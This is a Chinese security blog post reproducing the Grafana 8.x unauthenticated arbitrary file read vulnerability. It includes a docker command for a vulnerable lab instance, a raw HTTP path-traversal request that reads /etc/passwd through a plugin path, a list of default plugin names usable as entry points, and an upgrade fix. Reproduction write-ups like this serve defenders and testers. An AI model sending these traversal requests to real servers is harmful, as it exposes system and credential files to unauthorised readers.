<!DOCTYPE html>
<html>
        <head>
        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
        <meta charset="utf-8">
        <title>Grafana未授权任意文件读取漏洞 | 老白</title>
        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
         <script >hljs.initHighlightingOnLoad();</script>

    </head>
    <body>
              <header class="header mdui-m-b-5">      
            <div class="container  ">
                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
           
            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
                   
                            <li><a href="/">首页</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/archives">归档</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/tags">标签</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                  </nav>
                </div>
        </header>
        <div class="mdui-container ">
                <div class="mdui-row">
                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
                                    <div class="post-title  mdui-m-b-1">Grafana未授权任意文件读取漏洞</div>
                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-12-09 11:20:11">2021-12-09 / 2 min read</div>
                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="一-背景">一、背景</h1>
<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a><br>
<img src="https://V-alkoinen.github.io/post-images/1644375120664.png" alt="" loading="lazy"></p>
<h1 id="二-影响范围">二、影响范围</h1>
<p>  <code>grafana 8.x</code></p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<pre><code>docker run --name=grafana -d -p 80:3000 grafana/grafana:8.0.1
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644376089892.png" alt="" loading="lazy"></figure>
<pre><code>GET /public/plugins/cloudwatch/../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: &lt;host&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8n
Cookie: redirect_to=%2F
Connection: close
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1644376193114.png" alt="" loading="lazy"><br>
  通过<code>/api/plugins</code>接口查看所有插件</p>
<pre><code>GET /api/plugins HTTP/1.1
Host: &lt;host&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: */*
Cookie: grafana_session=ab39f8213543745da2f725f26b026f49
Connection: close
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644376310734.png" alt="" loading="lazy"></figure>
<pre><code>#默认插件
alertmanager
cloud-monitoring
cloudwatch
dashboard
elasticsearch
grafana
grafana-azure-monitor-datasource
graphite
influxdb
jaeger
loki
mixed
mssql
mysql
opentsdb
postgres
prometheus
tempo
testdata
zipkin
alertGroups
alertlist
annolist
barchart
bargauge
candlestick
canvas
dashlist
debug
gauge
geomap
gettingstarted
graph
heatmap
histogram
icon
live
logs
news
nodeGraph
piechart
pluginlist
stat
state-timeline
status-history
table
table-old
text
timeseries
welcome
xychart
</code></pre>
<h1 id="四-漏洞修复">四、漏洞修复</h1>
<p>  升级<code>grafana</code>至最新版本后(Grafana v8.3.5)，无该问题。<br>
<img src="https://V-alkoinen.github.io/post-images/1644376697803.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1644376703581.png" alt="" loading="lazy"></p>
</div>
                                    <div class="mdui-divider mdui-m-b-2"></div>
                                    <div class="mdui-row-xs-2 post-fenye">
                                       
                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">CVE-2021-42287/CVE-2021-42278 一键域控</a></div></div>
                                        

                                        
                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/"> CVE-2020-27986 SonarQube未授权访问</a></div> </div>
                                       
                                      </div>
                                   
                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
                                    
                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
 <div class="comment"></div>

<script>
      new Valine({
            el: '.comment',



            path: window.location.pathname,
            pageSize: 30,
            avatar:'mm', 
       })
    </script> 
<script>
    if(window.location.hash){
        var checkExist = setInterval(function() {
           if ($(window.location.hash).length) {
              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
              clearInterval(checkExist);
           }
        }, 100);
    }
</script>
                                </article>

                                    
                        </div>
                      </div>
    
                

              </div>
                    <footer class="footer mdui-m-t-5 mdui-text-center">
               <nav class="social-links">
                      <ul>
                      
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      </ul>
                    </nav>
                    <div class="copyright">
                      
                  </div>
                  
              </footer>
    </body>
</html>